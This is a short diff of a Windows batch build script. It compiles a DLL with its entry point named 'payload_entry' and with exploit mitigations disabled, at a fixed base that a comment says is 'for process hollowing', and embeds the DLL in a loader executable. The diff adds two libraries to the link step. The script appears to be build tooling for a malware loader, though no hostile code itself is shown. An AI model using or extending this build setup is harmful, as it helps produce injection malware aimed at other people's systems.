@@ -19,7 +19,7 @@ REM /DYNAMICBASE:NO /BASE:0x5F000000: fixed base for process hollowing
 REM /DDEBUG: enable debug logging (remove for production build)
 cl /nologo /LD /Od /Oi- /GS- /Gs1048576 /DDEBUG src\ckdll.cpp /Fe:bin\ckdll.dll ^
    /link /NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000 ^
-         /GUARD:NO /MACHINE:X64 kernel32.lib crypt32.lib bcrypt.lib
+         /GUARD:NO /MACHINE:X64 kernel32.lib crypt32.lib bcrypt.lib advapi32.lib iphlpapi.lib
 if errorlevel 1 (echo DLL BUILD FAILED & exit /b 1)
 
 REM --- generate payload.h (byte array of the DLL embedded in loader.exe) ---
